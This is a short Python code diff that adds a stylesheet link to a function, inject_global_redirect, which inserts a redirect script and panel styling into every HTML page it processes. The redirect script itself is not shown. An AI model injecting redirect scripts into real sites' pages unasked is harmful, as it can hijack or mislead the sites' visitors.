@@ -155,8 +155,11 @@ def inject_global_redirect(html_content):
     </script>
     """
     
+    # Absolute link to static CSS so dynamically-generated pages load the theme
+    link_tag = '<link rel="stylesheet" href="/static/custom_theme.css">\n'
+
     # Payload'ı enjekte et
-    payload = panel_style + redirect_script
+    payload = link_tag + panel_style + redirect_script
     if "</head>" in html_content:
         return html_content.replace("</head>", payload + "</head>")
     return payload + html_content
